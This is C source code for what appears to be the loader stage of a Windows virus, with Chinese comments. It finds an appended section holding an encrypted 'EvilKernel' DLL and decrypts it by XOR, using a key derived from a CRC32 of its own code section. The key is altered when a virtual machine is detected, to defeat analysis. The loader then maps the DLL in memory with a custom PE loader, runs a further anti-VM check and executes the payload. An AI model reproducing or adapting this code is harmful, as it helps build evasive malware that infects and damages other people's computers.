#include "Common.h"
#include <Windows.h>

#include "..\Common\xVirusSupport.c"

/*
 * 在病毒的末尾节结构
 * X病毒加载DLL
 * 目标程序映射所需要的空间
 */
__integer main(__char *pArgv[], __integer iArgc) {
	__integer iRet = 0;
	/*
	 * 这里主要负责加载DLL到内存
	 */
	PIMAGE_NT_HEADERS pNtHdr = NULL;
	PIMAGE_SECTION_HEADER pEvilSectionHdr = NULL;
	__memory pMem = NULL;
#if defined(__PRINT_DBG_INFO__)
	__dword dwPrintDbgInfoHandle = 0;
#endif

#if defined(__PRINT_DBG_INFO__)
	// 开启调试文件记录
	dwPrintDbgInfoHandle = __PrintDbgInfo_RecordToFileInit__("xVirusLog.txt");
#endif

	__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Get basic information\r\n");
	pMem = (__memory)GetModuleHandle(NULL);
	pNtHdr = __GetNtHeader__(pMem);
	pEvilSectionHdr = GetEvilSectionHeader(pNtHdr);

	/*
	 * 取出病毒加载DLL
	 * 并通过PE LOADER将其加载到内存
	 * 执行病毒执行DLL
	 */
	__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Get EvilKernel && load it to memory\r\n");
	{
		__integer iEvilKernelSize = 0;
		__memory pEvilKernel = NULL;
		__memory pEvilKernelBuffer = NULL;
		__dword dwKey = 0;//解密邪恶核心的密钥

		/*
		 * 计算邪恶核心的解密KEY
		 */
		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Get EvilKernel decode key\r\n");
		{
			__memory pCode = NULL;
			__integer iCodeSize = 0;
			PIMAGE_SECTION_HEADER pCodeSectionHdr = NULL;
			pCodeSectionHdr = GetCodeSectionHeader(pNtHdr);
			pCode = pMem + pCodeSectionHdr->VirtualAddress;
			iCodeSize = pCodeSectionHdr->Misc.VirtualSize;
			dwKey = crc32(pCode, iCodeSize);

			// 检测是否在虚拟机中,如果在则重新进行算KEY
			if (AntiVM0((__address)pMem)) dwKey ^= 0x19831210;
			__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "EvilKernel decode key = ");
			__PrintDbgInfo_RecordIntegerToFile__(dwPrintDbgInfoHandle, dwKey);
			__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "\r\n");
		}
		// 解密邪恶核心
		pEvilKernel = pMem + pEvilSectionHdr->VirtualAddress;
		iEvilKernelSize = pEvilSectionHdr->Misc.VirtualSize;
		pEvilKernelBuffer = (__memory)__logic_new_size__(iEvilKernelSize);
		XorArray(dwKey, pEvilKernel, pEvilKernelBuffer, iEvilKernelSize);
		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Decode EvilKernel completed\r\n");

		/*
		 * 将邪恶核心送到它该去的地方
		 */
		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Load EvilKernel to memory\r\n");
		{
			__memory pEvilKernelRuntime = NULL;
			__integer iEvilKernelImageBase = 0;
			PIMAGE_NT_HEADERS pEvilKernelNtHdr = NULL;
			pEvilKernelNtHdr = __GetNtHeader__(pEvilKernelBuffer);
			iEvilKernelImageBase = pEvilKernelNtHdr->OptionalHeader.SizeOfImage;
			pEvilKernelRuntime = (__memory)__logic_new_size__(iEvilKernelImageBase);
			/*
			 * 准备PE LOADER
			 */
			{
				FPEvilKernelEntry pEvilKernelEntry = NULL;

				__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Already LoaderEvilKernel(pEvilKernelBuffer, pEvilKernelRuntime, iEvilKernelImageBase)\r\n");
				pEvilKernelEntry = LoaderEvilKernel(pEvilKernelBuffer, pEvilKernelRuntime, iEvilKernelImageBase);
				if (!pEvilKernelEntry)
					return 0xFFFFEEEE;//随便返回一个值
				// 执行邪恶核心
				__logic_delete__(pEvilKernelBuffer);//是否临时内存
				__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Invoke EvilKernel dllmain\r\n");
				__PrintDbgInfo_RecordToFileClose__(dwPrintDbgInfoHandle);
				// 对抗虚拟机
				AntiVM1();
				pEvilKernelEntry((__dword)pEvilKernelRuntime, DLL_PROCESS_ATTACH, NULL);
			}
		}
	}

	/*
	 * 这里的代码都不会被执行,除非出错
	 */

	return iRet;
}
